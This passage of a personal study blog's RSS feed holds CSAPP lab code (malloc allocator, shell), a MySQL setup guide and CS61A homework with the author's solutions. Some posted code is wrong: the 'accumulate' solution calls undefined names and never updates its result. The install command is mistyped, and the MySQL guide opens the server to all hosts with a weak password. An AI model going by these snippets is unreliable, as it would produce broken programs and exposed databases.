        place(bp, asize);&#13;
        return bp;&#13;
    }&#13;
&#13;
    // 无空闲列表，则向系统申请分配内存， 最小单位为 4kb&#13;
    extend_size = MAX(asize, CHUNKSIZE);&#13;
    &#13;
    if ((bp = extend_heap(extend_size)) == NULL)&#13;
        return NULL;&#13;
    place(bp, asize);&#13;
    return bp;&#13;
}&#13;
&#13;
static void place_free(void *bp)&#13;
{&#13;
    size_t index = find_index(GET_SIZE(HDRP(bp)));&#13;
    char *start_bp = ITEM_OF_FREE_LIST(seg_listp, index);&#13;
&#13;
    // 根据DIFO策略寻找合适位置&#13;
    while (SUCC_FREE_BLKP(start_bp)!= 0)&#13;
    {&#13;
        if (SUCC_FREE_BLKP(start_bp) &gt; (unsigned int)bp)&#13;
        {&#13;
            break;&#13;
        }&#13;
        start_bp = SUCC_FREE_BLKP(start_bp);&#13;
    }&#13;
&#13;
    // 在合适位置建立链接start_bp_succ&#13;
    char *start_bp_succ = SUCC_FREE_BLKP(start_bp);&#13;
    PUT(SUCC(start_bp), bp);&#13;
    PUT(PREV(bp), start_bp);&#13;
    PUT(SUCC(bp), start_bp_succ);&#13;
    if (start_bp_succ != 0) {&#13;
        PUT(PREV(start_bp_succ), bp);&#13;
    }&#13;
}&#13;
&#13;
/*&#13;
 * mm_free - Freeing a block does nothing.&#13;
 */&#13;
&#13;
void mm_free(void *bp) {&#13;
    size_t size = GET_SIZE(HDRP(bp));&#13;
    PUT(HDRP(bp), PACK(size, 0));&#13;
    PUT(FTRP(bp), PACK(size, 0));&#13;
    coalesce(bp);&#13;
}&#13;
&#13;
/*&#13;
 * mm_realloc - Implemented simply in terms of mm_malloc and mm_free&#13;
 */&#13;
&#13;
void *mm_realloc(void *ptr, size_t size)&#13;
{&#13;
    if (ptr == NULL) {&#13;
        return mm_malloc(size);&#13;
    }&#13;
    if (size == 0) {&#13;
        mm_free(ptr);&#13;
        return NULL;&#13;
    }&#13;
    &#13;
    size_t asize = ALIGN(size) + DSIZE;&#13;
    size_t cur_bk_size = GET_SIZE(HDRP(ptr));&#13;
&#13;
    if (cur_bk_size == asize) {&#13;
        return ptr;&#13;
    } else if (cur_bk_size &lt; asize)&#13;
    {&#13;
        char *new_ptr = mm_malloc(size);&#13;
        memcpy(new_ptr, ptr, cur_bk_size - DSIZE);&#13;
        mm_free(ptr);&#13;
        return new_ptr;&#13;
    } else {&#13;
        // shrink&#13;
         size_t remaining_size = cur_bk_size - asize;&#13;
        if (remaining_size &gt;= MINI_BLOCK_SIZE)&#13;
        {&#13;
            PUT(HDRP(ptr), PACK(size, 1));&#13;
            PUT(FTRP(ptr), PACK(size, 1));&#13;
            PUT(HDRP(NEXT_BLKP(ptr)), PACK((remaining_size), 0));&#13;
            PUT(FTRP(NEXT_BLKP(ptr)), PACK((remaining_size), 0));&#13;
            coalesce(NEXT_BLKP(ptr));&#13;
        }&#13;
        return ptr;&#13;
    }&#13;
}&#13;
&#13;
static void *extend_heap(size_t size) {&#13;
    size_t asize = size % CHUNKSIZE == 0 ? size : ((size / CHUNKSIZE) + 1) * CHUNKSIZE;&#13;
    char *bp;&#13;
    if ((bp = mem_sbrk(asize)) == (void *)-1)&#13;
    {&#13;
        return NULL;&#13;
    }&#13;
    PUT(HDRP(bp), PACK(asize, 0));&#13;
    PUT(FTRP(bp), PACK(asize, 0));&#13;
    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));&#13;
&#13;
    size_t prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));&#13;
    if (!prev_alloc)&#13;
    {&#13;
        disconnect(PREV_BLKP(bp));&#13;
        asize += GET_SIZE(HDRP(PREV_BLKP(bp)));&#13;
        PUT(FTRP(bp), PACK(asize, 0));&#13;
        PUT(HDRP(PREV_BLKP(bp)), PACK(asize, 0));&#13;
        bp = PREV_BLKP(bp);&#13;
    }&#13;
    place_free(bp);&#13;
    return bp;&#13;
}&#13;
&#13;
static void *coalesce(void *bp) {&#13;
&#13;
    size_t size = GET_SIZE(HDRP(bp));&#13;
    size_t prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));&#13;
    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));&#13;
    if (prev_alloc &amp;&amp; next_alloc)&#13;
    {&#13;
        place_free(bp);&#13;
        return bp;&#13;
    }&#13;
&#13;
    if (prev_alloc &amp;&amp; !next_alloc)&#13;
    {&#13;
        disconnect(NEXT_BLKP(bp));&#13;
        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));&#13;
        PUT(HDRP(bp), PACK(size, 0));&#13;
        PUT(FTRP(bp), PACK(size, 0));&#13;
        place_free(bp);&#13;
    } else if (!prev_alloc &amp;&amp; next_alloc) {&#13;
        disconnect(PREV_BLKP(bp));&#13;
        size += GET_SIZE(HDRP(PREV_BLKP(bp)));&#13;
        PUT(FTRP(bp), PACK(size, 0));&#13;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));&#13;
        bp = PREV_BLKP(bp);&#13;
        place_free(bp);&#13;
    } else&#13;
    {&#13;
        disconnect(NEXT_BLKP(bp));&#13;
        disconnect(PREV_BLKP(bp));&#13;
        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));&#13;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));&#13;
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));&#13;
        bp = PREV_BLKP(bp);&#13;
        place_free(bp);&#13;
    }&#13;
    return bp;&#13;
}&#13;
&#13;
static size_t find_index(size_t size)&#13;
{&#13;
    if (size &lt;= 16)&#13;
        return 0;&#13;
    if (size &lt;= 32)&#13;
        return 1;&#13;
    if (size &lt;= 64)&#13;
        return 2;&#13;
    if (size &lt;= 80)&#13;
        return 3;&#13;
    if (size &lt;= 120)&#13;
        return 4;&#13;
    if (size &lt;= 240)&#13;
        return 5;&#13;
    if (size &lt;= 480)&#13;
        return 6;&#13;
    if (size &lt;= 960)&#13;
        return 7;&#13;
    if (size &lt;= 1920)&#13;
        return 8;&#13;
    if (size &lt;= 3840)&#13;
        return 9;&#13;
    if (size &lt;= 4096)&#13;
        return 10;&#13;
    if (size &lt;= 15360)&#13;
        return 11;&#13;
    if (size &lt;= 30720)&#13;
        return 12;&#13;
    if (size &lt;= 61440)&#13;
        return 13;&#13;
    else&#13;
        return 14;&#13;
}&#13;
```&#13;
。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Malloc%20lab.html</guid><pubDate>Tue, 06 Aug 2024 10:13:29 +0000</pubDate></item><item><title>Proxy Lab</title><link>https://LianSeKong.github.io/lizi/post/Proxy%20Lab.html</link><description># Proxy Lab&#13;
&#13;
&#13;
&gt;  本实验是CSAPP的最后一个实验，大部分内容都可参考书内样例&#13;
&gt;  实验主要涉及了IO、多线程、网络编程和并行等方面内容&#13;
&gt;  Web代理是一个在Web浏览器和终端服务器之间充当中间人的程序。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/Proxy%20Lab.html</guid><pubDate>Thu, 25 Jul 2024 07:02:35 +0000</pubDate></item><item><title>ubuntu上安装mysql</title><link>https://LianSeKong.github.io/lizi/post/ubuntu-shang-an-zhuang-mysql.html</link><description># Ubuntu Install Mysql&#13;
&#13;
1. 更新软件包&#13;
&#13;
   ```shell&#13;
   sudo apt install update&#13;
   ```&#13;
&#13;
2. 安装mysql服务器&#13;
&#13;
   ```shell&#13;
   sudo apt install mysql-server&#13;
   ```&#13;
&#13;
3. 启动服务&#13;
&#13;
   ```shell&#13;
   sudo systemctl start mysql&#13;
   ```&#13;
&#13;
4. 开机自启动&#13;
&#13;
   ```shell&#13;
   sudo systemctl enable mysql&#13;
   ```&#13;
&#13;
5. 修改密码&#13;
&#13;
   ```shell&#13;
   # 登录, 因为没有设置密码，管理员下直接以root用户登录&#13;
   sudo mysql&#13;
   &#13;
   ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';&#13;
   flush privileges;&#13;
   # &#13;
   &#13;
   ```&#13;
&#13;
6. 创建新用户&#13;
&#13;
   ```sql&#13;
    // % 代表所有地址都可通过此用户登录&#13;
   CREATE USER 'lpf'@'%' IDENTIFIED BY '123';&#13;
   &#13;
   ```&#13;
7. 够侦听远程可访问的接口 &#13;
&#13;
	``` shell&#13;
	sudo nvim /etc/mysql/mysql.conf.d/mysqld.cnf&#13;
	&#13;
	```&#13;
	`bind-address = 0.0.0.0`&#13;
&#13;
	&#13;
   &#13;
&#13;
。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/ubuntu-shang-an-zhuang-mysql.html</guid><pubDate>Sat, 20 Jul 2024 07:28:33 +0000</pubDate></item><item><title>cmu15213-fa15-hw12</title><link>https://LianSeKong.github.io/lizi/post/cmu15213-fa15-hw12.html</link><description># HW12&#13;
&#13;
## 12.16&#13;
&#13;
```c&#13;
void* thread(void * vargp) {&#13;
    printf('12.16 homework threadId:  %ld!\n', pthread_self());&#13;
    return NULL;&#13;
}&#13;
&#13;
int main(int argc, char **argv) {&#13;
    if (argc != 2) {&#13;
        fprintf(stderr, 'usage: %s &lt;n&gt;\n', argv[0]);&#13;
        exit(0);&#13;
    }&#13;
    int n = atoi(argv[1]);&#13;
    pthread_t tid[n];&#13;
    for (size_t i = 0; i &lt; n; i++) {&#13;
        pthread_create(&amp;tid[i], NULL, thread, NULL);&#13;
    }&#13;
    for (size_t i = 0; i &lt; n; i++) {&#13;
        pthread_join(tid[i], NULL); // 等待线程结束&#13;
    }&#13;
    exit(0);&#13;
}&#13;
```&#13;
&#13;
## 12.17&#13;
&#13;
```c&#13;
&#13;
void* thread(void * vargp) {&#13;
    sleep(1);&#13;
    printf('Hello, world!\n');&#13;
    return NULL;&#13;
}&#13;
&#13;
int main(int argc, char **argv) {&#13;
    pthread_t tid;&#13;
    pthread_create(&amp;tid, NULL, thread, NULL);&#13;
    pthread_join(tid, NULL);&#13;
    exit(0);&#13;
}&#13;
&#13;
```&#13;
&#13;
## 12.35&#13;
&#13;
&#13;
&#13;
```c&#13;
static int cnt = 0;&#13;
&#13;
void signchld_handler(int sig) {&#13;
    // WNOHANG: 如果等待集中的子进程均未终止，则立即返回（返回值为 0）。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cmu15213-fa15-hw12.html</guid><pubDate>Fri, 19 Jul 2024 10:08:57 +0000</pubDate></item><item><title>cmu15213-fa15-lec25</title><link>https://LianSeKong.github.io/lizi/post/cmu15213-fa15-lec25.html</link><description>&#13;
# 高级&#13;
&#13;
&#13;
&gt; 使用信号量协调对共享资源的访问&#13;
&gt; 使用同步可能会让代码执行变慢&#13;
&#13;
基本思想：线程使用信号量操作来通知另一个线程某个条件已变为真&#13;
1. 使用计数信号量来跟踪资源状态并通知其他线程&#13;
2. 使用互斥锁来保护对资源的访问&#13;
&#13;
两种典型例子： &#13;
1. 生产者-消费者问题&#13;
2. 读者-写者问题&#13;
&#13;
### 生产者-消费者&#13;
&#13;
常见的同步模式：&#13;
1. 生产者等待空位，将项目插入缓冲区，并通知消费者。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cmu15213-fa15-lec25.html</guid><pubDate>Thu, 18 Jul 2024 03:19:30 +0000</pubDate></item><item><title>cs61a-su24-hw02</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-hw02.html</link><description>## Instructions&#13;
&#13;
Download [hw02.zip](https://cs61a.org/hw/hw02/hw02.zip). Inside the archive, you will find a file called [hw02.py](https://cs61a.org/hw/hw02/hw02.py), along with a copy of the `ok` autograder.&#13;
&#13;
**Submission:** When you are done, submit the assignment by uploading all code files you've edited to Gradescope. You may submit more than once before the deadline; only the final submission will be scored. Check that you have successfully submitted your code on Gradescope. See [Lab 0](https://cs61a.org/lab/lab00#task-c-submitting-the-assignment) for more instructions on submitting assignments.&#13;
&#13;
**Using Ok:** If you have any questions about using Ok, please refer to [this guide.](https://cs61a.org/articles/using-ok)&#13;
&#13;
**Readings:** You might find the following references useful:&#13;
&#13;
*   [Section 1.6](https://www.composingprograms.com/pages/16-higher-order-functions.html)&#13;
*   [Section 1.7](https://www.composingprograms.com/pages/17-recursive-functions.html)&#13;
&#13;
**Grading:** Homework is graded based on correctness. Each incorrect problem will decrease the total score by one point. **This homework is out of 2 points.**&#13;
&#13;
Several doctests refer to these functions:&#13;
&#13;
```&#13;
from operator import add, mul&#13;
&#13;
square = lambda x: x * x&#13;
&#13;
identity = lambda x: x&#13;
&#13;
triple = lambda x: 3 * x&#13;
&#13;
increment = lambda x: x + 1&#13;
&#13;
```&#13;
&#13;
## Higher-Order Functions&#13;
&#13;
### Q1: Product&#13;
&#13;
Write a function called `product` that returns the product of the first `n` terms of a sequence. Specifically, `product` takes in an integer `n` and `term`, a single-argument function that determines a sequence. (That is, `term(i)` gives the `i`th term of the sequence.) `product(n, term)` should return `term(1) * ... * term(n)`.&#13;
&#13;
```&#13;
def product(n, term):&#13;
    '''Return the product of the first n terms in a sequence.&#13;
&#13;
    n: a positive integer&#13;
    term:  a function that takes one argument to produce the term&#13;
&#13;
    &gt;&gt;&gt; product(3, identity)  # 1 * 2 * 3&#13;
    6&#13;
    &gt;&gt;&gt; product(5, identity)  # 1 * 2 * 3 * 4 * 5&#13;
    120&#13;
    &gt;&gt;&gt; product(3, square)    # 1^2 * 2^2 * 3^2&#13;
    36&#13;
    &gt;&gt;&gt; product(5, square)    # 1^2 * 2^2 * 3^2 * 4^2 * 5^2&#13;
    14400&#13;
    &gt;&gt;&gt; product(3, increment) # (1+1) * (2+1) * (3+1)&#13;
    24&#13;
    &gt;&gt;&gt; product(3, triple)    # 1*3 * 2*3 * 3*3&#13;
    162&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
Use Ok to test your code:&#13;
&#13;
```&#13;
python3 ok -q product&#13;
&#13;
```&#13;
&#13;
:bear: &lt;u&gt;比较简单，就不解释了&lt;/u&gt;&#13;
&#13;
```python&#13;
def product(n, term):&#13;
    i, count = 1, 1&#13;
    while i &lt;= n:&#13;
        count, i = mul(count, term(i)), add(i, 1)&#13;
    return count&#13;
```&#13;
&#13;
### Q2: Accumulate&#13;
&#13;
Let's take a look at how `product` is an instance of a more general function called `accumulate`, which we would like to implement:&#13;
&#13;
```&#13;
def accumulate(fuse, start, n, term):&#13;
    '''Return the result of fusing together the first n terms in a sequence &#13;
    and start.  The terms to be fused are term(1), term(2), ..., term(n). &#13;
    The function fuse is a two-argument commutative &amp; associative function.&#13;
&#13;
    &gt;&gt;&gt; accumulate(add, 0, 5, identity)  # 0 + 1 + 2 + 3 + 4 + 5&#13;
    15&#13;
    &gt;&gt;&gt; accumulate(add, 11, 5, identity) # 11 + 1 + 2 + 3 + 4 + 5&#13;
    26&#13;
    &gt;&gt;&gt; accumulate(add, 11, 0, identity) # 11 (fuse is never used)&#13;
    11&#13;
    &gt;&gt;&gt; accumulate(add, 11, 3, square)   # 11 + 1^2 + 2^2 + 3^2&#13;
    25&#13;
    &gt;&gt;&gt; accumulate(mul, 2, 3, square)    # 2 * 1^2 * 2^2 * 3^2&#13;
    72&#13;
    &gt;&gt;&gt; # 2 + (1^2 + 1) + (2^2 + 1) + (3^2 + 1)&#13;
    &gt;&gt;&gt; accumulate(lambda x, y: x + y + 1, 2, 3, square)&#13;
    19&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
`accumulate` has the following parameters:&#13;
&#13;
*   `fuse`: a two-argument function that specifies how the current term is fused with the previously accumulated terms&#13;
*   `start`: value at which to start the accumulation&#13;
*   `n`: a non-negative integer indicating the number of terms to fuse&#13;
*   `term`: a single-argument function; `term(i)` is the `i`th term of the sequence&#13;
&#13;
Implement `accumulate`, which fuses the first `n` terms of the sequence defined by `term` with the `start` value using the `fuse` function.&#13;
&#13;
For example, the result of `accumulate(add, 11, 3, square)` is&#13;
&#13;
```&#13;
add(11,  add(square(1), add(square(2),  square(3)))) =&#13;
    11 +     square(1) +    square(2) + square(3)    =&#13;
    11 +     1         +    4         + 9            = 25&#13;
&#13;
```&#13;
&#13;
Assume that `fuse` is commutative, `fuse(a, b) == fuse(b, a)`, and associative, `fuse(fuse(a, b), c) == fuse(a, fuse(b, c))`.&#13;
&#13;
Then, implement `summation` (from lecture) and `product` as one-line calls to `accumulate`.&#13;
&#13;
**Important:** Both `summation_using_accumulate` and `product_using_accumulate` should be implemented with a single line of code starting with `return`.&#13;
&#13;
```&#13;
def summation_using_accumulate(n, term):&#13;
    '''Returns the sum: term(1) + ... + term(n), using accumulate.&#13;
&#13;
    &gt;&gt;&gt; summation_using_accumulate(5, square) # square(0) + square(1) + ... + square(4) + square(5)&#13;
    55&#13;
    &gt;&gt;&gt; summation_using_accumulate(5, triple) # triple(0) + triple(1) + ... + triple(4) + triple(5)&#13;
    45&#13;
    &gt;&gt;&gt; # This test checks that the body of the function is just a return statement.&#13;
    &gt;&gt;&gt; import inspect, ast&#13;
    &gt;&gt;&gt; [type(x).__name__ for x in ast.parse(inspect.getsource(summation_using_accumulate)).body[0].body]&#13;
    ['Expr', 'Return']&#13;
    '''&#13;
    return ____&#13;
&#13;
def product_using_accumulate(n, term):&#13;
    '''Returns the product: term(1) * ... * term(n), using accumulate.&#13;
&#13;
    &gt;&gt;&gt; product_using_accumulate(4, square) # square(1) * square(2) * square(3) * square()&#13;
    576&#13;
    &gt;&gt;&gt; product_using_accumulate(6, triple) # triple(1) * triple(2) * ... * triple(5) * triple(6)&#13;
    524880&#13;
    &gt;&gt;&gt; # This test checks that the body of the function is just a return statement.&#13;
    &gt;&gt;&gt; import inspect, ast&#13;
    &gt;&gt;&gt; [type(x).__name__ for x in ast.parse(inspect.getsource(product_using_accumulate)).body[0].body]&#13;
    ['Expr', 'Return']&#13;
    '''&#13;
    return ____&#13;
&#13;
&#13;
```&#13;
&#13;
Use Ok to test your code:&#13;
&#13;
```&#13;
python3 ok -q accumulate&#13;
python3 ok -q summation_using_accumulate&#13;
python3 ok -q product_using_accumulate&#13;
&#13;
```&#13;
&#13;
:bear: `accumulate： 对product的每次相乘行为替换为抽象的函数`&#13;
&#13;
```python&#13;
def accumulate(fuse, start, n, term):&#13;
    i, count = 1, start&#13;
    while i &lt;= n:&#13;
        start, i = merger(fuse, term(i)), add(i + 1)&#13;
    return count&#13;
```&#13;
&#13;
:bear: `summation_using_accumulate: product的变体`&#13;
&#13;
```python&#13;
def summation_using_accumulate(n, term):&#13;
    return accumulate(add, term(0), n, term)&#13;
```&#13;
&#13;
:bear: `sproduct_using_accumulate: product的变体`&#13;
&#13;
```python&#13;
def product_using_accumulate(n, term):&#13;
 	return accumulate(mul, 1, n, term)&#13;
```&#13;
&#13;
&#13;
&#13;
### Q3: Make Repeater&#13;
&#13;
Implement the function `make_repeater` which takes a one-argument function `f` and a positive integer `n`. It returns a one-argument function, where `make_repeater(f, n)(x)` returns the value of `f(f(...f(x)...))` in which `f` is applied `n` times to `x`. For example, `make_repeater(square, 3)(5)` squares 5 three times and returns 390625, just like `square(square(square(5)))`.&#13;
&#13;
```&#13;
def make_repeater(f, n):&#13;
    '''Returns the function that computes the nth application of f.&#13;
&#13;
    &gt;&gt;&gt; add_three = make_repeater(increment, 3)&#13;
    &gt;&gt;&gt; add_three(5)&#13;
    8&#13;
    &gt;&gt;&gt; make_repeater(triple, 5)(1) # 3 * (3 * (3 * (3 * (3 * 1))))&#13;
    243&#13;
    &gt;&gt;&gt; make_repeater(square, 2)(5) # square(square(5))&#13;
    625&#13;
    &gt;&gt;&gt; make_repeater(square, 3)(5) # square(square(square(5)))&#13;
    390625&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
Use Ok to test your code:&#13;
&#13;
```&#13;
python3 ok -q make_repeater&#13;
&#13;
```&#13;
&#13;
:bear:  &#13;
&#13;
```python&#13;
def make_repeater(f, n):&#13;
    def helper(x):&#13;
        i = n;&#13;
        while i:&#13;
            x = f(x)&#13;
            i = i - 1;&#13;
        return x&#13;
    return helper&#13;
```&#13;
&#13;
&#13;
&#13;
## Recursion&#13;
&#13;
### Q4: Digit Distance&#13;
&#13;
For a given integer, the _digit distance_ is the sum of the absolute differences between consecutive digits. For example:&#13;
&#13;
*   The digit distance of `6` is `0`.&#13;
*   The digit distance of `61` is `5`, as the absolute value of `6 - 1` is `5`.&#13;
*   The digit distance of `71253` is `12` (`6 + 1 + 3 + 2`).&#13;
&#13;
Write a function that determines the digit distance of a given positive integer. You must use recursion or the tests will fail.&#13;
&#13;
**Hint:** There are multiple valid ways of solving this problem! If you're stuck, try writing out an iterative solution first, and then convert your iterative solution into a recursive one.&#13;
&#13;
```&#13;
def digit_distance(n):&#13;
    '''Determines the digit distance of n.&#13;
&#13;
    &gt;&gt;&gt; digit_distance(3)&#13;
    0&#13;
    &gt;&gt;&gt; digit_distance(777)&#13;
    0&#13;
    &gt;&gt;&gt; digit_distance(314)&#13;
    5&#13;
    &gt;&gt;&gt; digit_distance(31415926535)&#13;
    32&#13;
    &gt;&gt;&gt; digit_distance(3464660003)&#13;
    16&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban all loops&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'digit_distance',&#13;
    ...       ['For', 'While'])&#13;
    True&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
Use Ok to test your code:&#13;
&#13;
```&#13;
python3 ok -q digit_distance&#13;
&#13;
```&#13;
&#13;
:bear:&#13;
&#13;
```python&#13;
def digit_distance(n):&#13;
    if n &lt; 10:&#13;
        return 0&#13;
    else:&#13;
        return abs(sub(n % 10, n // 10 % 10)) + digit_distance(n // 10)&#13;
```&#13;
&#13;
&#13;
&#13;
### Q5: Interleaved Sum&#13;
&#13;
Write a function `interleaved_sum`, which takes in a number `n` and two one-argument functions: `odd_func` and `even_func`. It applies `odd_func` to every odd number and `even_func` to every even number from 1 to `n` _inclusive_ and returns the sum.&#13;
&#13;
For example, executing `interleaved_sum(5, lambda x: x, lambda x: x * x)` returns `1 + 2*2 + 3 + 4*4 + 5 = 29`.&#13;
&#13;
**Important:** Implement this function without using any loops or directly testing if a number is odd or even -- aka modulos (`%`) are not allowed! Instead of directly checking whether a number is even or odd, start with 1, which you know is an odd number.&#13;
&#13;
**Hint:** Introduce an inner helper function that takes an odd number `k` and computes an interleaved sum from `k` to `n` (including `n`).&#13;
&#13;
```&#13;
def interleaved_sum(n, odd_func, even_func):&#13;
    '''Compute the sum odd_func(1) + even_func(2) + odd_func(3) + ..., up&#13;
    to n.&#13;
&#13;
    &gt;&gt;&gt; identity = lambda x: x&#13;
    &gt;&gt;&gt; square = lambda x: x * x&#13;
    &gt;&gt;&gt; triple = lambda x: x * 3&#13;
    &gt;&gt;&gt; interleaved_sum(5, identity, square) # 1   + 2*2 + 3   + 4*4 + 5&#13;
    29&#13;
    &gt;&gt;&gt; interleaved_sum(5, square, identity) # 1*1 + 2   + 3*3 + 4   + 5*5&#13;
    41&#13;
    &gt;&gt;&gt; interleaved_sum(4, triple, square)   # 1*3 + 2*2 + 3*3 + 4*4&#13;
    32&#13;
    &gt;&gt;&gt; interleaved_sum(4, square, triple)   # 1*1 + 2*3 + 3*3 + 4*3&#13;
    28&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'interleaved_sum', ['While', 'For', 'Mod']) # ban loops and %&#13;
    True&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'interleaved_sum', ['BitAnd', 'BitOr', 'BitXor']) # ban bitwise operators, don't worry about these if you don't know what they are&#13;
    True&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
Use Ok to test your code:&#13;
&#13;
```&#13;
python3 ok -q interleaved_sum&#13;
&#13;
```&#13;
&#13;
:bear:`interleaved_sum`&#13;
&#13;
```python&#13;
def interleaved_sum(n, odd_func, even_func):&#13;
    if n == 0:&#13;
        return 0&#13;
    elif n % 2 == 1:&#13;
        return odd_func(n) + interleaved_sum(n - 1, odd_func, even_func)&#13;
    else:&#13;
        return even_func(n) + interleaved_sum(n - 1, odd_func, even_func)&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
### Q6: Count Coins&#13;
&#13;
Given a positive integer `total`, a set of coins makes change for `total` if the sum of the values of the coins is `total`. Here we will use standard US Coin values: 1, 5, 10, 25. For example, the following sets make change for `15`:&#13;
&#13;
*   15 1-cent coins&#13;
*   10 1-cent, 1 5-cent coins&#13;
*   5 1-cent, 2 5-cent coins&#13;
*   5 1-cent, 1 10-cent coins&#13;
*   3 5-cent coins&#13;
*   1 5-cent, 1 10-cent coin&#13;
&#13;
Thus, there are 6 ways to make change for `15`. Write a **recursive** function `count_coins` that takes a positive integer `total` and returns the number of ways to make change for `total` using coins.&#13;
&#13;
You can use _either_ of the functions given to you:&#13;
&#13;
*   `next_larger_coin` will return the next larger coin denomination from the input, i.e. `next_larger_coin(5)` is `10`.&#13;
*   `next_smaller_coin` will return the next smaller coin denomination from the input, i.e. `next_smaller_coin(5)` is `1`.&#13;
*   Either function will return `None` if the next coin value does not exist&#13;
&#13;
There are two main ways in which you can approach this problem. One way uses `next_larger_coin`, and another uses `next_smaller_coin`. It is up to you which one you want to use!&#13;
&#13;
**Important:** Use recursion; the tests will fail if you use loops.&#13;
&#13;
**Hint:** Refer to the [implementation](https://www.composingprograms.com/pages/17-recursive-functions.html#example-partitions) of `count_partitions` for an example of how to count the ways to sum up to a final value with smaller parts. If you need to keep track of more than one value across recursive calls, consider writing a helper function.&#13;
&#13;
```&#13;
def next_larger_coin(coin):&#13;
    '''Returns the next larger coin in order.&#13;
    &gt;&gt;&gt; next_larger_coin(1)&#13;
    5&#13;
    &gt;&gt;&gt; next_larger_coin(5)&#13;
    10&#13;
    &gt;&gt;&gt; next_larger_coin(10)&#13;
    25&#13;
    &gt;&gt;&gt; next_larger_coin(2) # Other values return None&#13;
    '''&#13;
    if coin == 1:&#13;
        return 5&#13;
    elif coin == 5:&#13;
        return 10&#13;
    elif coin == 10:&#13;
        return 25&#13;
&#13;
def next_smaller_coin(coin):&#13;
    '''Returns the next smaller coin in order.&#13;
    &gt;&gt;&gt; next_smaller_coin(25)&#13;
    10&#13;
    &gt;&gt;&gt; next_smaller_coin(10)&#13;
    5&#13;
    &gt;&gt;&gt; next_smaller_coin(5)&#13;
    1&#13;
    &gt;&gt;&gt; next_smaller_coin(2) # Other values return None&#13;
    '''&#13;
    if coin == 25:&#13;
        return 10&#13;
    elif coin == 10:&#13;
        return 5&#13;
    elif coin == 5:&#13;
        return 1&#13;
&#13;
def count_coins(total):&#13;
    '''Return the number of ways to make change using coins of value of 1, 5, 10, 25.&#13;
    &gt;&gt;&gt; count_coins(15)&#13;
    6&#13;
    &gt;&gt;&gt; count_coins(10)&#13;
    4&#13;
    &gt;&gt;&gt; count_coins(20)&#13;
    9&#13;
    &gt;&gt;&gt; count_coins(100) # How many ways to make change for a dollar?&#13;
    242&#13;
    &gt;&gt;&gt; count_coins(200)&#13;
    1463&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban iteration&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'count_coins', ['While', 'For'])&#13;
    True&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
```&#13;
&#13;
```&#13;
python3 ok -q count_coins&#13;
```&#13;
&#13;
:bear:&#13;
&#13;
```python&#13;
# 边界情况： 硬币为0，方案正确。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-hw02.html</guid><pubDate>Wed, 17 Jul 2024 11:38:44 +0000</pubDate></item><item><title>cs61a-su24-hw01</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-hw01.html</link><description>---&#13;
url: https://cs61a.org/hw/hw01/&#13;
title: Homework 1 &#13;
date: 2024-07-17 16:08:34&#13;
tag: &#13;
banner: 'https://images.unsplash.com/photo-1719749937847-ab76d3e0dbb7?crop=entropy&amp;cs=srgb&amp;fm=jpg&amp;ixid=M3w0Njc1ODd8MHwxfHJhbmRvbXx8fHx8fHwxfHwxNzIxMjAzNjE1fA&amp;ixlib=rb-4.0.3&amp;q=85&amp;fit=crop&amp;w=624&amp;max-h=540'&#13;
banner_icon: 🔖&#13;
---&#13;
sr-annote { all: unset; }&#13;
&#13;
_Due by 11:59pm on Wednesday, June 26  &#13;
截止日期为 6 月 26 日星期三晚上 11：59_&#13;
&#13;
## Instructions 指示&#13;
&#13;
Download [hw01.zip](https://cs61a.org/hw/hw01/hw01.zip). 下载hw01.zip。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-hw01.html</guid><pubDate>Wed, 17 Jul 2024 08:32:14 +0000</pubDate></item><item><title>Shell Lab</title><link>https://LianSeKong.github.io/lizi/post/Shell%20Lab.html</link><description>``` c&#13;
/*&#13;
 * tsh - A tiny shell program with job control&#13;
 *&#13;
 * &lt;Put your name and login ID here&gt;&#13;
 */&#13;
#include &lt;stdio.h&gt;&#13;
#include &lt;stdlib.h&gt;&#13;
#include &lt;unistd.h&gt;&#13;
#include &lt;string.h&gt;&#13;
#include &lt;ctype.h&gt;&#13;
#include &lt;signal.h&gt;&#13;
#include &lt;sys/types.h&gt;&#13;
#include &lt;sys/wait.h&gt;&#13;
#include &lt;errno.h&gt;&#13;
&#13;
/* Misc manifest constants */&#13;
#define MAXLINE 1024   /* max line size */&#13;
